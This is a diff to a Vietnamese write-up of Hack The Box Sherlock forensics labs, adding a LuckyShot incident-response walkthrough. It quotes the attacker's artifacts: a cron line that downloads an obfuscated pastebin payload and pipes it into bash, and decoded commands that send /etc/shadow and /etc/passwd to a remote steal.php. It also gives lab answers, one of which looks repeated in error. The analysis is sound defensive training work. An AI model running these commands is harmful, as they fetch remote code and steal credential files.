@@ -1947,7 +1947,7 @@ Trong `/var/www/html/jabc/includes/bootstrap.inc`:
 **$\rightarrow$ Đáp án: `4444`**
 
 ## E. Hack The Box:
-### 1. Packet Puzzle:
+### I. Packet Puzzle:
 - [Link bài lab](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle?tab=play_sherlock)
 - Đề bài: *"You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions."*
 - File được cho: `PacketPuzzle.zip`, giải nén ra ta được `NetworkTraffic.pcap`
@@ -2080,7 +2080,7 @@ Trong TCP Stream vừa rồi, ngay sau đó có command:
 
 **$\rightarrow$ Đáp án cần điền là `Cannot create process Win32Error:2`**
 
-### 2. Unsupervised:
+### II. Unsupervised:
 > - [Link bài lab](https://app.hackthebox.com/sherlocks/Unsupervised?tab=play_sherlock)
 > - Đề cho `Image.ad1` và `Important Files and Folders.txt`. Nội dung `Important Files and Folders.txt`:
 > 
@@ -2215,7 +2215,7 @@ Từ output câu 6 và 7.
 
 **$\rightarrow$ Đáp án: `Shenzhen SanDiYiXin Electronic Co.,LTD`**
 
-### 3. Nuts:
+### III. Nuts:
 > - [Link bài lab](https://app.hackthebox.com/sherlocks/Nuts)
 > - Đề cho một folder chứa ổ `C:/`.
 > - Đề bài:
@@ -2425,3 +2425,127 @@ Từ output câu 17:
 ![image](https://hackmd.io/_uploads/ryeWPjxPWx.png)
 
 **$\rightarrow$ Đáp án: `2024-03-19 19:30:04`**
+
+### IV. LuckyShot:
+- [Link bài lab](https://app.hackthebox.com/sherlocks/LuckyShot?tab=play_sherlock)
+- Kịch bản: *"The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team. As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine."*
+- Đề cho file `LuckShot.zip` chứa:
+![image](https://hackmd.io/_uploads/SyhTnKI9bl.png)
+
+#### 1. What method did the attacker use to gain access to the system?
+Kiểm tra `\LuckyShot\[root]\var\log\auth.log`, lướt từ dưới lên trên thấy có rất nhiều đoạn như:
+![image](https://hackmd.io/_uploads/BJaVkcIq-l.png)
+**$\rightarrow$ Đáp án: `Brute Force`**
+
+#### 2. At what time did the attacker successfully log in for the first time?
+Từ file trên, ta thấy:
+![image](https://hackmd.io/_uploads/ByYoHCvcZe.png)
+**$\rightarrow$ Đáp án: `2025-02-10 19:39:03`**
+
+#### 3. Which user account was compromised by the attacker
+Cũng từ ouput câu trên, ta tìm được đáp án là `administrator`.
+
+**$\rightarrow$ Đáp án: `administrator`**
+
+#### 4. What command was executed by the attacker to check user privileges?
+Kiểm tra `\[root]\home\administrator\.bash_history`, ta thấy:
+![image](https://hackmd.io/_uploads/SJ41F5Uq-x.png)
+**$\rightarrow$ Đáp án: `groups administrator`**
+
+#### 5. What was the first tool the attacker downloaded to extract stored credentials from the system
+Từ output câu trên, tiếp tục kiểm tra:
+![image](https://hackmd.io/_uploads/rJ6OF585be.png)
+**$\rightarrow$ Đáp án: `LaZagne`**
+
+#### 6. The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?
+Từ output câu trên:
+![image](https://hackmd.io/_uploads/SkB-59U9-g.png)
+**$\rightarrow$ Đáp án: `scp`**
+> - SCP (secure copy – bản sao an toàn) là một tiện ích dòng lệnh cho phép user sao chép files và thư mục trên Linux hệ thống cục bộ đến một hệ thống từ xa và ngược lại, hoặc giữa hai hệ thống từ xa từ hệ thống cục bộ.
+> - Khi dùng SCP để chuyển dữ liệu thì cả thông tin và mật khẩu tệp đều được mã hoá để bảo vệ quyền riêng tư của owner.
+
+#### 7. What IP did the attacker exfiltrate the files to?
+Từ output câu trên:
+![image](https://hackmd.io/_uploads/SkB-59U9-g.png)
+**$\rightarrow$ Đáp án: `192.168.161.198`**
+
+#### 8. The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?
+Từ output câu trên:
+![image](https://hackmd.io/_uploads/rkKn35Lcbx.png)
+**$\rightarrow$ Đáp án: `sys_monitor.sh`**
+
+#### 9. What is the SHA1 hash of the malware?
+Vào `LuckyShot\hash_executables\hash_executables.sha1`:
+![image](https://hackmd.io/_uploads/H1PuTcI9Zx.png)
+**$\rightarrow$ Đáp án: `3ae5dea716a4f7bfb18046bfba0553ea01021c75`**
+
+#### 10. The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?
+-  `auth.log`:
+![image](https://hackmd.io/_uploads/B1mglj8cWe.png)
+- Trong `/[root]/etc/systemd/system/systemd-networkm.service`:
+![image](https://hackmd.io/_uploads/BkLQQo8cbe.png)
+
+**$\rightarrow$ Đáp án: `systemd-networkm.service`**
+
+#### 11. The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?
+Trong thư mục `/[root]/root`, thử xem nội dung của từng file:
+![image](https://hackmd.io/_uploads/SybvY0D5Wg.png)
+- `.ssh` có bằng chứng cho thấy attacker đang thiết lập cơ chế Persistence để có thể quay lại hệ thống bất cứ lúc nào mà không cần mật khẩu:
+![image](https://hackmd.io/_uploads/By1BsCP9bx.png)
+    - Nếu chèn đoạn mã vào `/.ssh/authorized_keys` vào máy victim, attacker có thể remote vào từ xa thông qua SSH bằng Private Key tương ứng mà không cần biết mật khẩu.
+    - Ở đây, `ssh-rsa` là loại thuật toán, theo sau là chuỗi mã hoá base64 nội dung khoá và tên máy của attacker là `kali@kali`.
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCnoiT13BNG/mRCoizCTYQncnZkhm62c0WivVvTZ32FxGh+J8HzLcYnI3/FLPt2FfAkjXV1+LU+gLHtFossAIo4BfuZj7c1xwxbuEbGjD5sEYI9ayiIGV+NUM99zweVI2fVt18s0y99EHS1h94aqMT3J/J7hjbMhAuQC8ij295WReT3XvXkZ0U6YI/qFPoO7VnE4OPjq8Cgmfr7PXdpsLBs5FZ5qX6T9nWuU3yDSZWMLGyYMo0VlT1oY7fcUJyMRCjG9YHxFlGhX+136qLD+PlDWMaBJqVHfiTNyP8V4Yz9gitJ45veO6dPTa9sUHUe2LeNAVFmEgAvfaLyMZPBl6CEXzvtZbYH4Yld1U86tascPTXtLDdLipe2ElMisuld58gqWQYctkyuPTvkJwlZvxfVcFN0bA3uapEi2S3toQdoLJZO06UZxOJBBI2pjFIBJkJdiIpOzsvNPTs46hsmaIN97RHAWgm8fTd1yjXOiqoZlAo9Jujvh6KAuHiHANAuztSvC5IrgVWM5wiZBQRAVfrZanojjZr8ig22GEKupEuwCgNHc4V+VLj6ki0u5E6xeBEyhH9qZO3erK9xvqR5VMGqUnfa6qo9/ORaILj4CpX08/5He9JbgOIPpOOFEVm6e/AudL8PcPsE+oJwlXZFoyWoRyAd7CJBkbEaGHTjQ643Lw== kali@kali
+```
+- Trong `.bashrc`:
+![image](https://hackmd.io/_uploads/HJuoiAD5-l.png)
+- Trong `.profile`:
+![image](https://hackmd.io/_uploads/ryTCiADq-x.png)
+
+**$\rightarrow$ Đáp án: `systemd-networkm.service`**
+
+#### 12. What is the username and hostname associated with the attacker?
+Từ output câu trên:
+![image](https://hackmd.io/_uploads/Hk2S20wc-g.png)
+**$\rightarrow$ Đáp án: `kali@kali`**
+
+#### 13. The attacker created a user for persistence, what is the name of the created user?
+Lần mò trong `auth.log`:
+![image](https://hackmd.io/_uploads/rJC_G1u5bx.png)
+**$\rightarrow$ Đáp án: `Regev`**
+
+#### 14. At what exact timestamp was the new user created on the system?
+Cũng từ output câu trên:
+![image](https://hackmd.io/_uploads/rJC_G1u5bx.png)
+**$\rightarrow$ Đáp án: `2025-02-10 20:11:21`**
+
+#### 15. The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?
+- `/etc/cron.d` là một thư mục hệ thống chứa các files cấu hình cho các tác vụ lập lịch định kỳ. Bất kỳ file nào được đặt vào đây với đúng định dạng sẽ được dịch vụ `crond` tự động quét và thực thi mà không cần khởi động lại máy.
+- Trong `/etc/cron.d/syscheck`:
+```
+/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
+```
+
+**$\rightarrow$ Đáp án: `command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash`**
+
+#### 16. The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file
+- Từ command trên, ta thấy sau khi tải nội dung thô từ web thì đảo ngược toàn bộ chuỗi rồi giải mã nó từ base64 và chạy.
+- Vào link trên, ta được:
+```
+=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY
+```
+- Chạy đoạn `.py` sau:
+``` py
+import base64
+
+payload = "=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY"
+reverse_str = payload[::-1]
+result = (base64.b64decode(reverse_str)).decode('utf-8')
+print(result)
+```
+Ta được output:
+```
+base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
+base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php
+```
+**$\rightarrow$ Đáp án: `base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php`**
